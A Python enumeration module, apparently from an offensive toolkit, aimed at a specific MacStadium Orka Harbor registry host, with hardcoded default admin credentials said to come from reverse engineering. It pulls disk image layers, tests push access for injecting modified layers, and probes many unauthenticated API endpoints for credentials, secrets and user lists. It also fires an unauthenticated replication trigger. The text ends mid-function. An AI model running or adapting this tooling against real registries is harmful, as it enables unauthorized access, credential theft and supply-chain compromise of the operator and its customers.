#!/usr/bin/env python3
"""
Harbor Registry Enumeration Module — MacStadium Orka supply-chain surface

Targets: OCI/Harbor registries serving Orka VM disk image layers.
Default creds: admin:Harbor12345 (extracted from Orka engine RE)
Default host:  orkv10000009-01.oci.las1.macstadiumcloud.com

Key content-type: application/vnd.macstadium.orka-engine.disk.layer.v1+lz4
Layer blobs are Apple bv41-framed LZ4 blocks (see core/bv41_decoder.py).

Supply-chain attack surface:
  - Read: pull any layer, decode with bv41_decoder, inspect macOS disk contents
  - Write: if push_access=True, inject modified layers into image manifests
  - Config blob: <1KB JSON with build metadata, paths, environment hints
"""

import base64
import json
import sys
import urllib.request
import urllib.error
from pathlib import Path

# bv41 decoder — works from any working directory
sys.path.insert(0, str(Path(__file__).parent.parent))
try:
    from core.bv41_decoder import probe_bv41, is_bv41
    _HAS_BV41 = True
except ImportError:
    _HAS_BV41 = False

try:
    import requests as _requests
    _HAS_REQUESTS = True
except ImportError:
    _HAS_REQUESTS = False


HARBOR_DEFAULT_HOST = "orkv10000009-01.oci.las1.macstadiumcloud.com"
HARBOR_DEFAULT_USER = "admin"
HARBOR_DEFAULT_PASS = "Harbor12345"

ORKA_LAYER_MEDIA_TYPE = "application/vnd.macstadium.orka-engine.disk.layer.v1+lz4"
MANIFEST_ACCEPT = (
    "application/vnd.oci.image.manifest.v1+json,"
    "application/vnd.docker.distribution.manifest.v2+json"
)


def _basic_auth_header(user, password):
    token = base64.b64encode(f"{user}:{password}".encode()).decode()
    return f"Basic {token}"


def _http(method, url, headers=None, body=None, timeout=10, follow_redirects=True):
    """HTTP request via requests or urllib. Returns (status, headers_dict, body_bytes)."""
    hdrs = headers or {}
    if _HAS_REQUESTS:
        resp = _requests.request(
            method, url, headers=hdrs,
            data=body, timeout=timeout,
            allow_redirects=follow_redirects,
            verify=False,
        )
        return resp.status_code, dict(resp.headers), resp.content
    # urllib fallback
    req = urllib.request.Request(url, headers=hdrs, data=body, method=method)
    try:
        opener = urllib.request.build_opener()
        if not follow_redirects:
            opener = urllib.request.build_opener(NoRedirectHandler())
        with opener.open(req, timeout=timeout) as r:
            return r.status, dict(r.headers), r.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except urllib.error.URLError as e:
        raise ConnectionError(str(e)) from e


class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


class HarborEnumerator:
    def __init__(self, host=HARBOR_DEFAULT_HOST, user=HARBOR_DEFAULT_USER,
                 password=HARBOR_DEFAULT_PASS, timeout=10):
        self.base = f"https://{host}"
        self.auth = _basic_auth_header(user, password)
        self.timeout = timeout
        self._auth_headers = {"Authorization": self.auth}

    def _get(self, path, extra_headers=None):
        hdrs = dict(self._auth_headers)
        if extra_headers:
            hdrs.update(extra_headers)
        status, resp_headers, body = _http("GET", f"{self.base}{path}", hdrs, timeout=self.timeout)
        try:
            data = json.loads(body)
        except Exception:
            data = body.decode("utf-8", errors="replace") if isinstance(body, bytes) else body
        return status, resp_headers, data

    def catalog(self):
        """List all repositories."""
        status, _, data = self._get("/v2/_catalog")
        if status == 200 and isinstance(data, dict):
            return data.get("repositories", [])
        return []

    def tags(self, repo):
        """List tags for a repository."""
        status, _, data = self._get(f"/v2/{repo}/tags/list")
        if status == 200 and isinstance(data, dict):
            return data.get("tags", [])
        return []

    def manifest(self, repo, tag):
        """Pull manifest for repo:tag. Returns (status, manifest_dict_or_str)."""
        status, _, data = self._get(
            f"/v2/{repo}/manifests/{tag}",
            {"Accept": MANIFEST_ACCEPT},
        )
        return status, data

    def layer_metadata(self, repo, tag):
        """Return list of {digest, size, media_type} for each layer in the manifest."""
        status, mf = self.manifest(repo, tag)
        if status != 200 or not isinstance(mf, dict):
            return []
        layers = mf.get("layers", [])
        return [
            {
                "digest": l.get("digest", ""),
                "size": l.get("size", 0),
                "media_type": l.get("mediaType", ""),
            }
            for l in layers
        ]

    def probe_config(self, repo, tag):
        """Pull and parse the config blob (usually <1KB, contains build metadata)."""
        status, mf = self.manifest(repo, tag)
        if status != 200 or not isinstance(mf, dict):
            return {"error": f"manifest fetch failed: {status}"}
        config_desc = mf.get("config", {})
        digest = config_desc.get("digest", "")
        if not digest:
            return {"error": "no config digest in manifest"}
        status2, _, data = self._get(f"/v2/{repo}/blobs/{digest}")
        if status2 == 200 and isinstance(data, dict):
            return data
        return {"raw": str(data)[:512], "status": status2}

    def probe_bv41_layer(self, repo, tag, layer_index=0, probe_bytes=131072):
        """
        Pull the first `probe_bytes` of a disk layer blob and run probe_bv41()
        on it. Returns bv41 chunk stats dict, or an error dict.

        Requires: pip install lz4 (for full decode; probe_bv41 just reads headers)
        Falls back gracefully if Range not supported (206 not returned).
        """
        if not _HAS_BV41:
            return {"error": "bv41_decoder not importable"}

        layers = self.layer_metadata(repo, tag)
        if not layers:
            return {"error": "no layers found"}
        if layer_index >= len(layers):
            return {"error": f"layer_index {layer_index} out of range ({len(layers)} layers)"}

        layer = layers[layer_index]
        digest = layer["digest"]
        total_size = layer["size"]

        hdrs = dict(self._auth_headers)
        hdrs["Range"] = f"bytes=0-{probe_bytes - 1}"
        # Blob pulls may 307 to a storage backend — follow redirects
        status, resp_headers, body = _http(
            "GET",
            f"{self.base}/v2/{repo}/blobs/{digest}",
            hdrs,
            timeout=self.timeout,
            follow_redirects=True,
        )

        if status not in (200, 206):
            return {"error": f"blob fetch returned {status}", "digest": digest}

        got_bytes = len(body)
        if not is_bv41(body):
            return {
                "error": "response is not bv41 (wrong magic bytes)",
                "first_bytes_hex": body[:8].hex(),
                "http_status": status,
            }

        info = probe_bv41(body)
        info["digest"] = digest
        info["layer_total_size_bytes"] = total_size
        info["probed_bytes"] = got_bytes
        info["partial"] = status == 206 or got_bytes < total_size
        return info

    def check_push_access(self, repo):
        """
        Initiate a blob upload to test write access. POSTs to
        /v2/{repo}/blobs/uploads/ — a 202 means the registry accepted the
        session; we immediately abandon it without pushing any data.
        Returns True if push is permitted, False otherwise.
        """
        hdrs = dict(self._auth_headers)
        hdrs["Content-Length"] = "0"
        status, resp_headers, _ = _http(
            "POST",
            f"{self.base}/v2/{repo}/blobs/uploads/",
            hdrs,
            body=b"",
            timeout=self.timeout,
            follow_redirects=False,
        )
        return status == 202

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _host_port(self):
        """Return (hostname_str, port_int) parsed from self.base."""
        base = self.base.replace("https://", "").replace("http://", "")
        if ":" in base:
            h, p = base.rsplit(":", 1)
            return h, int(p)
        return base, 443

    def _get_unauth(self, path):
        """GET without any Authorization header. Returns (status, headers, data)."""
        status, resp_headers, body = _http(
            "GET", f"{self.base}{path}", {}, timeout=self.timeout
        )
        try:
            data = json.loads(body)
        except Exception:
            data = body.decode("utf-8", errors="replace") if isinstance(body, bytes) else body
        return status, resp_headers, data

    # ------------------------------------------------------------------
    # Attack surface checks
    # ------------------------------------------------------------------

    def check_robot_accounts(self, token: str = None) -> list:
        """Robot account attack surface.

        Findings:
          CRITICAL — ROBOT_ACCOUNTS_READABLE_UNAUTH   (unauth 200 on /robots)
          HIGH     — ROBOT_ACCOUNT_NO_EXPIRY           (ExpiresAt == -1)
          MEDIUM   — PRIVILEGED_ROBOT_ACCOUNT_NAME     (name contains admin/system)
        """
        findings = []
        host, port = self._host_port()

        # Unauthenticated probe first
        status_unauth, _, _ = self._get_unauth("/api/v2.0/robots")
        if status_unauth == 200:
            findings.append({
                "severity": "CRITICAL",
                "title": "ROBOT_ACCOUNTS_READABLE_UNAUTH",
                "detail": "Robot account list accessible without authentication via GET /api/v2.0/robots",
                "host": host,
                "port": port,
            })

        # Authenticated probe — inspect each account
        status, _, data = self._get("/api/v2.0/robots")
        if status == 200 and isinstance(data, list):
            for robot in data:
                name = robot.get("name", "")
                expires_at = robot.get("expires_at", None)
                if expires_at == -1:
                    findings.append({
                        "severity": "HIGH",
                        "title": "ROBOT_ACCOUNT_NO_EXPIRY",
                        "detail": f"Robot account '{name}' has no expiry (expires_at=-1); credential never rotates",
                        "host": host,
                        "port": port,
                    })
                name_lower = name.lower()
                if "admin" in name_lower or "system" in name_lower:
                    findings.append({
                        "severity": "MEDIUM",
                        "title": "PRIVILEGED_ROBOT_ACCOUNT_NAME",
                        "detail": f"Robot account name suggests elevated privilege: '{name}'",
                        "host": host,
                        "port": port,
                    })
        return findings

    def check_replication_rules(self, token: str = None) -> list:
        """Replication rule credential exposure.

        Findings:
          CRITICAL — REPLICATION_REGISTRIES_READABLE_UNAUTH  (unauth 200 on /registries)
          HIGH     — REPLICATION_CRED_EXPOSED_IN_API          (plaintext password in response)
        """
        findings = []
        host, port = self._host_port()

        # Unauth probe on registries endpoint
        status_unauth, _, _ = self._get_unauth("/api/v2.0/replication/registries")
        if status_unauth == 200:
            findings.append({
                "severity": "CRITICAL",
                "title": "REPLICATION_REGISTRIES_READABLE_UNAUTH",
                "detail": "Replication registry list accessible without authentication via GET /api/v2.0/replication/registries",
                "host": host,
                "port": port,
            })

        # Authed — inspect registries for plaintext credentials
        status, _, data = self._get("/api/v2.0/replication/registries")
        if status == 200 and isinstance(data, list):
            for reg in data:
                cred = reg.get("credential", {}) or {}
                password = cred.get("access_secret", None) or reg.get("password", None)
                if password:
                    findings.append({
                        "severity": "HIGH",
                        "title": "REPLICATION_CRED_EXPOSED_IN_API",
                        "detail": (
                            f"Registry '{reg.get('name', '')}' credential returned in plaintext "
                            "in GET /api/v2.0/replication/registries response"
                        ),
                        "host": host,
                        "port": port,
                    })

        # Authed — list policies (enumeration surface; findings via registries above)
        self._get("/api/v2.0/replication/policies")

        return findings

    def check_webhook_secrets(self, token: str = None, projects: list = None) -> list:
        """Webhook secret exposure.

        Findings:
          CRITICAL — WEBHOOKS_READABLE_UNAUTH       (unauth 200 on webhook policies)
          HIGH     — WEBHOOK_SECRET_EXPOSED_IN_API  (auth_header in GET response)
          MEDIUM   — WEBHOOK_TLS_VERIFY_DISABLED    (skip_cert_verify=True)
        """
        findings = []
        host, port = self._host_port()

        if not projects:
            status, _, data = self._get("/api/v2.0/projects")
            if status == 200 and isinstance(data, list):
                projects = [p.get("name", "") for p in data if p.get("name")]
            else:
                projects = []

        for project_name in projects[:10]:
            path = f"/api/v2.0/projects/{project_name}/webhook/policies"

            # Unauth probe
            status_unauth, _, _ = self._get_unauth(path)
            if status_unauth == 200:
                findings.append({
                    "severity": "CRITICAL",
                    "title": "WEBHOOKS_READABLE_UNAUTH",
                    "detail": f"Webhook policies for project '{project_name}' readable without authentication",
                    "host": host,
                    "port": port,
                })

            # Authed probe — check each webhook
            status, _, data = self._get(path)
            if status == 200 and isinstance(data, list):
                for wh in data:
                    wh_name = wh.get("name", "")
                    auth_header = wh.get("auth_header", None)
                    if isinstance(auth_header, str) and auth_header:
                        findings.append({
                            "severity": "HIGH",
                            "title": "WEBHOOK_SECRET_EXPOSED_IN_API",
                            "detail": (
                                f"Webhook '{wh_name}' in project '{project_name}' "
                                "exposes auth_header value in GET response"
                            ),
                            "host": host,
                            "port": port,
                        })
                    if wh.get("skip_cert_verify", False):
                        findings.append({
                            "severity": "MEDIUM",
                            "title": "WEBHOOK_TLS_VERIFY_DISABLED",
                            "detail": f"Webhook '{wh_name}' in project '{project_name}' has TLS certificate verification disabled",
                            "host": host,
                            "port": port,
                        })
        return findings

    def check_oidc_misconfiguration(self, token: str = None) -> list:
        """OIDC auth bypass surface.

        Findings:
          HIGH   — OIDC_CERT_VERIFY_DISABLED  (oidc_verify_cert=false in /configurations)
          MEDIUM — OIDC_AUTO_ONBOARD           (oidc_auto_onboard=true)
          MEDIUM — SYSTEMINFO_EXPOSED_UNAUTH   (unauth 200 on /systeminfo)
        """
        findings = []
        host, port = self._host_port()

        # Systeminfo unauth probe
        status_unauth, _, data_unauth = self._get_unauth("/api/v2.0/systeminfo")
        if status_unauth == 200:
            auth_mode = ""
            harbor_version = ""
            if isinstance(data_unauth, dict):
                auth_mode = data_unauth.get("auth_mode", "")
                harbor_version = data_unauth.get("harbor_version", "")
            findings.append({
                "severity": "MEDIUM",
                "title": "SYSTEMINFO_EXPOSED_UNAUTH",
                "detail": (
                    f"System info readable without authentication: "
                    f"auth_mode={auth_mode}, harbor_version={harbor_version}"
                ),
                "host": host,
                "port": port,
            })

        # Admin configuration probe (requires admin auth)
        status, _, data = self._get("/api/v2.0/configurations")
        if status == 200 and isinstance(data, dict):
            def _cfg_val(field, default):
                val = data.get(field, {})
                if isinstance(val, dict):
                    return val.get("value", default)
                return val if val is not None else default

            if _cfg_val("oidc_verify_cert", True) is False:
                findings.append({
                    "severity": "HIGH",
                    "title": "OIDC_CERT_VERIFY_DISABLED",
                    "detail": "oidc_verify_cert=false: OIDC provider TLS certificate not validated; MITM possible",
                    "host": host,
                    "port": port,
                })
            if _cfg_val("oidc_auto_onboard", False) is True:
                findings.append({
                    "severity": "MEDIUM",
                    "title": "OIDC_AUTO_ONBOARD",
                    "detail": "oidc_auto_onboard=true: users auto-created on first OIDC login without admin approval",
                    "host": host,
                    "port": port,
                })
        return findings

    def check_garbage_collection_log(self, token: str = None) -> list:
        """GC log and job service exposure.

        Findings:
          MEDIUM — GC_LOG_EXPOSED              (unauth 200 on /system/gc/log)
          HIGH   — GC_SCHEDULE_READABLE_UNAUTH (unauth 200 on /system/gc)
          HIGH   — JOBSERVICE_READABLE_UNAUTH  (unauth 200 on /jobservice/queues)
        """
        findings = []
        host, port = self._host_port()

        status_gclog, _, _ = self._get_unauth("/api/v2.0/system/gc/log")
        if status_gclog == 200:
            findings.append({
                "severity": "MEDIUM",
                "title": "GC_LOG_EXPOSED",
                "detail": "Garbage collection log readable without authentication via GET /api/v2.0/system/gc/log",
                "host": host,
                "port": port,
            })

        status_gc, _, _ = self._get_unauth("/api/v2.0/system/gc")
        if status_gc == 200:
            findings.append({
                "severity": "HIGH",
                "title": "GC_SCHEDULE_READABLE_UNAUTH",
                "detail": "GC schedule readable without authentication via GET /api/v2.0/system/gc",
                "host": host,
                "port": port,
            })

        status_js, _, _ = self._get_unauth("/api/v2.0/jobservice/queues")
        if status_js == 200:
            findings.append({
                "severity": "HIGH",
                "title": "JOBSERVICE_READABLE_UNAUTH",
                "detail": "Job service queues readable without authentication via GET /api/v2.0/jobservice/queues",
                "host": host,
                "port": port,
            })

        return findings

    def check_artifact_labels(self, token: str, project: str, repo: str) -> list:
        """Artifact metadata / image config secret exposure.

        Findings:
          LOW      — DEBUG_ARTIFACT_IN_PRODUCTION_REGISTRY  (label contains debug/test/dev)
          CRITICAL — SECRET_IN_IMAGE_CONFIG                 (env var key contains PASSWORD/SECRET/API_KEY)
        """
        findings = []
        host, port = self._host_port()

        encoded_repo = repo.replace("/", "%2F")
        path = (
            f"/api/v2.0/projects/{project}/repositories/{encoded_repo}"
            "/artifacts?page=1&page_size=10&with_label=true&with_scan_overview=false"
        )
        status, _, data = self._get(path)
        if status != 200 or not isinstance(data, list):
            return findings

        debug_markers = {"debug", "test", "dev"}
        secret_markers = {"PASSWORD", "SECRET", "API_KEY"}

        for artifact in data[:10]:
            digest_short = (artifact.get("digest", "") or "")[:16]

            # Label check
            labels = artifact.get("labels", []) or []
            for label in labels:
                label_name = (label.get("name", "") or "").lower()
                if any(m in label_name for m in debug_markers):
                    findings.append({
                        "severity": "LOW",
                        "title": "DEBUG_ARTIFACT_IN_PRODUCTION_REGISTRY",
                        "detail": (
                            f"Artifact {digest_short} in {project}/{repo} "
                            f"has debug/test/dev label: '{label.get('name', '')}'"
                        ),
                        "host": host,
                        "port": port,
                    })
                    break  # one finding per artifact

            # Image config env check
            extra_attrs = artifact.get("extra_attrs", {}) or {}
            config = extra_attrs.get("config", {}) or {}
            env_list = config.get("Env", []) or []
            for env_entry in env_list:
                if not isinstance(env_entry, str):
                    continue
                key = env_entry.split("=", 1)[0].upper()
                if any(sm in key for sm in secret_markers):
                    findings.append({
                        "severity": "CRITICAL",
                        "title": "SECRET_IN_IMAGE_CONFIG",
                        "detail": (
                            f"Artifact {digest_short} in {project}/{repo} "
                            f"has secret-like env var baked into image config: '{env_entry.split('=')[0]}'"
                        ),
                        "host": host,
                        "port": port,
                    })

        return findings

    def enumerate_all(self, projects: list = None) -> dict:
        """Run all enumeration checks and return consolidated findings dict.

        Calls: check_robot_accounts, check_replication_rules, check_webhook_secrets,
               check_oidc_misconfiguration, check_garbage_collection_log,
               check_artifact_labels (first 3 projects x 3 repos each).
        """
        results = {
            "host": self.base,
            "findings": [],
        }

        # Fetch project list if not provided
        if not projects:
            status, _, data = self._get("/api/v2.0/projects")
            if status == 200 and isinstance(data, list):
                projects = [p.get("name", "") for p in data if p.get("name")]
            else:
                projects = []
        results["projects"] = projects

        # Core checks
        results["findings"].extend(self.check_robot_accounts())
        results["findings"].extend(self.check_replication_rules())
        results["findings"].extend(self.check_webhook_secrets(projects=projects))
        results["findings"].extend(self.check_oidc_misconfiguration())
        results["findings"].extend(self.check_garbage_collection_log())

        # Artifact label / image-config checks across first 3 projects x 3 repos
        for proj in projects[:3]:
            repo_status, _, repo_data = self._get(
                f"/api/v2.0/projects/{proj}/repositories?page=1&page_size=5"
            )
            if repo_status != 200 or not isinstance(repo_data, list):
                continue
            for repo in repo_data[:3]:
                repo_full = repo.get("name", "")
                # Harbor returns "project/repo" in name field; strip project prefix
                repo_short = repo_full.split("/", 1)[1] if "/" in repo_full else repo_full
                results["findings"].extend(
                    self.check_artifact_labels(token=None, project=proj, repo=repo_short)
                )

        # Summary
        results["finding_count"] = len(results["findings"])
        results["severity_counts"] = {
            sev: sum(1 for f in results["findings"] if f["severity"] == sev)
            for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW")
        }
        return results

    def run(self, repo="library/tahoe-base"):
        """Orchestrate all checks. Returns findings dict."""
        findings = {"host": self.base, "repo": repo}

        # Catalog
        repos = self.catalog()
        findings["catalog"] = repos
        findings["catalog_count"] = len(repos)

        # Tags
        tag_list = self.tags(repo)
        findings["tags"] = tag_list
        tag = tag_list[0] if tag_list else "latest"

        # Manifest + layer metadata
        layers = self.layer_metadata(repo, tag)
        findings["layers"] = layers
        findings["layer_count"] = len(layers)

        orka_layers = [l for l in layers if l["media_type"] == ORKA_LAYER_MEDIA_TYPE]
        findings["orka_layer_count"] = len(orka_layers)

        # Config blob (build metadata)
        findings["config"] = self.probe_config(repo, tag)

        # bv41 probe on first Orka layer
        if orka_layers:
            target_idx = layers.index(orka_layers[0])
            findings["bv41_probe"] = self.probe_bv41_layer(repo, tag, layer_index=target_idx)
        else:
            findings["bv41_probe"] = {"error": "no Orka layer media type found"}

        # Push access
        findings["push_access"] = self.check_push_access(repo)

        return findings


# ---------------------------------------------------------------------------
# Standalone probe functions (no HarborEnumerator instance required)
# ---------------------------------------------------------------------------

def _standalone_get(host, port, path, timeout):
    """Unauthenticated GET for standalone probe functions. Returns (status, data)."""
    base_url = f"https://{host}" if port == 443 else f"https://{host}:{port}"
    url = f"{base_url}{path}"
    try:
        status, _hdrs, body = _http("GET", url, {}, timeout=timeout)
    except Exception:
        return -1, None
    try:
        data = json.loads(body)
    except Exception:
        data = body.decode("utf-8", errors="replace") if isinstance(body, bytes) else body
    return status, data


def _standalone_post(host, port, path, body_dict, timeout):
    """Unauthenticated POST with JSON body for standalone probe functions. Returns (status, data)."""
    base_url = f"https://{host}" if port == 443 else f"https://{host}:{port}"
    url = f"{base_url}{path}"
    body_bytes = json.dumps(body_dict).encode()
    try:
        status, _hdrs, resp_body = _http(
            "POST", url, {"Content-Type": "application/json"},
            body=body_bytes, timeout=timeout,
        )
    except Exception:
        return -1, None
    try:
        data = json.loads(resp_body)
    except Exception:
        data = resp_body.decode("utf-8", errors="replace") if isinstance(resp_body, bytes) else resp_body
    return status, data


def probe_harbor_vulnerability_scanner(host, port=443, timeout=5.0):
    """Probe Harbor vulnerability scanner API surface without authentication.

    Checks:
      CRITICAL — SCANNER_API_UNAUTH        GET /api/v2.0/scanners returns 200 unauth
      HIGH     — PROJECT_SCANNER_READABLE  GET /api/v2.0/projects/1/scanner returns 200 unauth
      CRITICAL — CVE_ALLOWLIST_READABLE    GET /api/v2.0/system/CVEAllowlist returns 200 unauth
                                           (suppressed vulnerabilities disclosed)

    Returns list of {severity, title, detail, host, port}.
    """
    findings = []

    status, data = _standalone_get(host, port, "/api/v2.0/scanners", timeout)
    if status == 200:
        count = len(data) if isinstance(data, list) else "unknown"
        findings.append({
            "severity": "CRITICAL",
            "title": "SCANNER_API_UNAUTH",
            "detail": (
                f"Vulnerability scanner list readable without authentication "
                f"via GET /api/v2.0/scanners ({count} scanner(s) returned)"
            ),
            "host": host,
            "port": port,
        })

    status, data = _standalone_get(host, port, "/api/v2.0/projects/1/scanner", timeout)
    if status == 200:
        scanner_name = data.get("name", "") if isinstance(data, dict) else ""
        findings.append({
            "severity": "HIGH",
            "title": "PROJECT_SCANNER_READABLE",
            "detail": (
                "Project scanner configuration readable without authentication "
                "via GET /api/v2.0/projects/1/scanner"
                + (f": scanner='{scanner_name}'" if scanner_name else "")
            ),
            "host": host,
            "port": port,
        })

    status, data = _standalone_get(host, port, "/api/v2.0/system/CVEAllowlist", timeout)
    if status == 200:
        item_count = len(data.get("items", []) or []) if isinstance(data, dict) else 0
        findings.append({
            "severity": "CRITICAL",
            "title": "CVE_ALLOWLIST_READABLE",
            "detail": (
                "CVE allowlist readable without authentication via GET /api/v2.0/system/CVEAllowlist "
                f"— suppressed vulnerabilities disclosed ({item_count} CVE(s) suppressed)"
            ),
            "host": host,
            "port": port,
        })

    return findings


def probe_harbor_replication(host, port=443, timeout=5.0):
    """Probe Harbor replication policy and registry surface without authentication.

    Checks:
      CRITICAL — REPLICATION_POLICY_UNAUTH  GET /api/v2.0/replication/policies returns 200 unauth
                                            (remote registry credentials exposed)
      CRITICAL — REGISTRY_LIST_UNAUTH       GET /api/v2.0/registries returns 200 unauth
                                            (external registry inventory)
      HIGH     — REPLICATION_TRIGGER_UNAUTH POST /api/v2.0/replication/executions accepted unauth

    Returns list of {severity, title, detail, host, port}.
    """
    findings = []

    status, data = _standalone_get(host, port, "/api/v2.0/replication/policies", timeout)
    if status == 200:
        count = len(data) if isinstance(data, list) else "unknown"
        findings.append({
            "severity": "CRITICAL",
            "title": "REPLICATION_POLICY_UNAUTH",
            "detail": (
                "Replication policies readable without authentication "
                f"via GET /api/v2.0/replication/policies — remote registry credentials exposed "
                f"({count} policy record(s) returned)"
            ),
            "host": host,
            "port": port,
        })

    status, data = _standalone_get(host, port, "/api/v2.0/registries", timeout)
    if status == 200:
        count = len(data) if isinstance(data, list) else "unknown"
        findings.append({
            "severity": "CRITICAL",
            "title": "REGISTRY_LIST_UNAUTH",
            "detail": (
                "External registry inventory readable without authentication "
                f"via GET /api/v2.0/registries ({count} registry record(s) returned)"
            ),
            "host": host,
            "port": port,
        })

    status, _data = _standalone_post(
        host, port, "/api/v2.0/replication/executions",
        {"policy_id": 1}, timeout,
    )
    if status in (200, 201, 202):
        findings.append({
            "severity": "HIGH",
            "title": "REPLICATION_TRIGGER_UNAUTH",
            "detail": (
                "Replication execution trigger accepted without authentication "
                f"via POST /api/v2.0/replication/executions (policy_id=1, HTTP {status})"
            ),
            "host": host,
            "port": port,
        })

    return findings


def probe_harbor_oidc_config(host, port=443, timeout=5.0):
    """Probe Harbor OIDC configuration and user list surface without authentication.

    Checks:
      MEDIUM   — DATABASE_AUTH_MODE    /systeminfo auth_mode == "db_auth" (no SSO enforcement)
      CRITICAL — SYSTEM_CONFIG_UNAUTH  GET /api/v2.0/configurations returns 200 unauth
                                       (OIDC client_secret potentially exposed)
      CRITICAL — USER_LIST_UNAUTH      GET /api/v2.0/users returns 200 unauth

    Returns list of {severity, title, detail, host, port}.
    """
    findings = []

    status, data = _standalone_get(host, port, "/api/v2.0/systeminfo", timeout)
    if status == 200 and isinstance(data, dict):
        auth_mode = data.get("auth_mode", "")
        if auth_mode == "db_auth":
            findings.append({
                "severity": "MEDIUM",
                "title": "DATABASE_AUTH_MODE",
                "detail": (
                    "Harbor configured with local database authentication (auth_mode=db_auth); "
                    "no SSO/OIDC enforcement — credential-stuffing surface active"
                ),
                "host": host,
                "port": port,
            })

    status, data = _standalone_get(host, port, "/api/v2.0/configurations", timeout)
    if status == 200:
        secret_exposed = False
        if isinstance(data, dict):
            oidc_secret = data.get("oidc_client_secret", {})
            if isinstance(oidc_secret, dict):
                secret_exposed = bool(oidc_secret.get("value", ""))
            elif oidc_secret:
                secret_exposed = True
        findings.append({
            "severity": "CRITICAL",
            "title": "SYSTEM_CONFIG_UNAUTH",
            "detail": (
                "System configuration readable without authentication "
                "via GET /api/v2.0/configurations"
                + (" — OIDC client_secret value present in response" if secret_exposed else "")
            ),
            "host": host,
            "port": port,
        })

    status, data = _standalone_get(host, port, "/api/v2.0/users", timeout)
    if status == 200:
        count = len(data) if isinstance(data, list) else "unknown"
        findings.append({
            "severity": "CRITICAL",
            "title": "USER_LIST_UNAUTH",
            "detail": (
                f"User list readable without authentication via GET /api/v2.0/users "
                f"({count} user(s) returned)"
            ),
            "host": host,
            "port": port,
        })

    return findings


def probe_harbor_artifact_labels(host, port=443, timeout=5.0):
    """Probe Harbor label and public project/repository surface without authentication.

    Checks:
      HIGH     — LABEL_LIST_UNAUTH      GET /api/v2.0/labels returns 200 unauth
                                        (artifact classification exposed)
      HIGH     — PUBLIC_PROJECTS_EXIST  GET /api/v2.0/projects returns public projects
      CRITICAL — REPOSITORIES_UNAUTH   GET /api/v2.0/projects/{name}/repositories
                                        returns 200 unauth for a public project

    Returns list of {severity, title, detail, host, port}.
    """
    findings = []

    status, data = _standalone_get(host, port, "/api/v2.0/labels", timeout)
    if status == 200:
        count = len(data) if isinstance(data, list) else "unknown"
        findings.append({
            "severity": "HIGH",
            "title": "LABEL_LIST_UNAUTH",
            "detail": (
                "Artifact label list readable without authentication "
                f"via GET /api/v2.0/labels — artifact classification exposed "
                f"({count} label(s) returned)"
            ),
            "host": host,
            "port": port,
        })

    public_project_names = []
    status, data = _standalone_get(host, port, "/api/v2.0/projects?page_size=100", timeout)
    if status == 200 and isinstance(data, list):
        public_projects = [
            p for p in data
            if isinstance(p, dict)
            and (p.get("metadata", {}) or {}).get("public", "false") in ("true", True, 1)
        ]
        public_project_names = [p.get("name", "") for p in public_projects if p.get("name")]
        if public_projects:
            name_sample = ", ".join(public_project_names[:5])
            if len(public_project_names) > 5:
                name_sample += " ..."
            findings.append({
                "severity": "HIGH",
                "title": "PUBLIC_PROJECTS_EXIST",
                "detail": (
                    f"{len(public_projects)} public project(s) found: {name_sample}"
                ),
                "host": host,
                "port": port,
            })

    for project_name in public_project_names[:3]:
        path = f"/api/v2.0/projects/{project_name}/repositories"
        status, data = _standalone_get(host, port, path, timeout)
        if status == 200:
            count = len(data) if isinstance(data, list) else "unknown"
            findings.append({
                "severity": "CRITICAL",
                "title": "REPOSITORIES_UNAUTH",
                "detail": (
                    f"Repository list for project '{project_name}' readable without authentication "
                    f"via GET {path} ({count} repository record(s) returned)"
                ),
                "host": host,
                "port": port,
            })
            break  # one finding per surface sufficient

    return findings


def probe_harbor_proxy_cache(host, port=443, timeout=5.0):
    """Probe Harbor proxy cache and upstream registry surface without authentication.

    Mirrors the sandbox behavioral enumeration pattern from dynamic malware analysis:
    just as a sandbox logs every outbound connection a specimen attempts, this probe
    maps every upstream registry target Harbor is silently pulling from — the same
    unauthenticated exfiltration surface, different layer.  Malware classification
    parallels apply: an open registry list functions like an open C2 channel list;
    an unauthenticated ping endpoint is a downloader vector without the installer.

    Checks:
      CRITICAL — HARBOR_REGISTRY_LIST_UNAUTH   GET /api/v2.0/registries returns 200
                                               unauthenticated; upstream proxy-cache
                                               targets (Docker Hub, ECR, GCR, etc.)
                                               fully enumerable by any caller.
      HIGH     — HARBOR_REGISTRY_INFO_UNAUTH   GET /api/v2.0/registries/1/info returns
                                               200 unauth; credential hint fields
                                               (access_key, description) exposed for
                                               the first configured registry.
      HIGH     — HARBOR_REGISTRY_PING_UNAUTH   POST /api/v2.0/registries/ping returns
                                               200 without auth; attacker can probe
                                               reachability of arbitrary upstream
                                               registries using Harbor as a pivot.
      HIGH     — HARBOR_PROXY_CACHE_PROJECTS   GET /api/v2.0/projects?type=proxy_cache
                                               returns 200 unauth; proxy-cache project
                                               names and pull-through configuration
                                               exposed without a session.

    Returns list of {severity, title, detail, host, port}.
    """
    findings = []

    # Registry list — upstream proxy-cache targets
    status, data = _standalone_get(host, port, "/api/v2.0/registries", timeout)
    if status == 200:
        count = len(data) if isinstance(data, list) else "unknown"
        name_sample = ""
        if isinstance(data, list) and data:
            names = [r.get("name", "") for r in data if isinstance(r, dict) and r.get("name")]
            name_sample = ", ".join(names[:5])
            if len(names) > 5:
                name_sample += " ..."
        findings.append({
            "severity": "CRITICAL",
            "title": "HARBOR_REGISTRY_LIST_UNAUTH",
            "detail": (
                f"Upstream registry list readable without authentication via GET "
                f"/api/v2.0/registries — {count} registry record(s) returned"
                + (f": {name_sample}" if name_sample else "")
            ),
            "host": host,
            "port": port,
        })

    # First registry detail — credential hint fields
    status, data = _standalone_get(host, port, "/api/v2.0/registries/1/info", timeout)
    if status == 200:
        hint = ""
        if isinstance(data, dict):
            supported_resource_types = data.get("supported_resource_types", [])
            hint = f"; supported_resource_types={supported_resource_types}" if supported_resource_types else ""
        findings.append({
            "severity": "HIGH",
            "title": "HARBOR_REGISTRY_INFO_UNAUTH",
            "detail": (
                "First upstream registry info readable without authentication via "
                f"GET /api/v2.0/registries/1/info — credential hint fields exposed{hint}"
            ),
            "host": host,
            "port": port,
        })

    # Registry ping — pivot to probe arbitrary upstream targets
    ping_body = {"type": "docker-hub", "url": "https://hub.docker.com"}
